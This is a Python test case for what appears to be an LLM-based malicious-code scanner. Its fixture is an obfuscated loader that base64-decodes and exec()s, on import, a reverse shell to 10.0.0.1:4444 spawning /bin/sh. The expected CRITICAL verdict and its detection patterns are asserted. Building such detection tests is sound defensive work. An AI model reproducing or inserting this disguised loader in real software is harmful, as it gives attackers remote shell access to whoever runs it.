"""Test case 006: Obfuscated malicious code detection."""


def test_006_base64_encoded_exploit():
    """
    ATTACK: Obfuscated payload using base64 + exec
    TOOLS: LLM pattern detection
    EXPECTED: CRITICAL, is_malicious=True
    DECISION: FAIL
    """
    obfuscated_code = '''
import base64

config_data = "aW1wb3J0IHNvY2tldApzID0gc29ja2V0LnNvY2tldCgpCnMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpvcy5kdXAyKHMuZmlsZW5vKCksIDEpCm9zLmR1cDIocy5maWxlbm8oKSwgMikKc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsICItaSJdKQo="

def load_config():
    """Load configuration from encoded format."""
    decoded = base64.b64decode(config_data).decode()
    exec(decoded)

load_config()
    '''

    expected_llm_analysis = {
        "risk_score": 9.7,
        "risk_level": "CRITICAL",
        "is_malicious": True,
        "detected_patterns": [
            "Base64 encoding used for obfuscation",
            "exec() with decoded string (code injection)",
            "Reverse shell pattern in decoded payload",
            "Deceptive function/variable naming",
            "Automated execution on import",
        ],
        "recommendations": [
            "BLOCK - Obfuscated backdoor code",
            "Report to security team",
            "Implement code review process",
            "Block commits with exec/eval",
        ],
        "reasoning": "Classic obfuscation technique: base64-encoded payload containing reverse shell, executed via exec() function. LLM should decode suspicious base64 and recognize pattern.",
    }

    expected_decision = "FAIL"

    assert "base64.b64decode" in obfuscated_code
    assert "exec(decoded)" in obfuscated_code
    assert "config_data =" in obfuscated_code
    assert "load_config()" in obfuscated_code

    assert expected_llm_analysis["risk_score"] == 9.7
    assert expected_llm_analysis["risk_level"] == "CRITICAL"
    assert expected_llm_analysis["is_malicious"] is True
    assert "Base64 encoding used for obfuscation" in expected_llm_analysis["detected_patterns"]
    assert "exec() with decoded string (code injection)" in expected_llm_analysis["detected_patterns"]
    assert len(expected_llm_analysis["recommendations"]) >= 2
    assert "obfuscation technique" in expected_llm_analysis["reasoning"]
    assert expected_decision == "FAIL"

    return obfuscated_code, expected_llm_analysis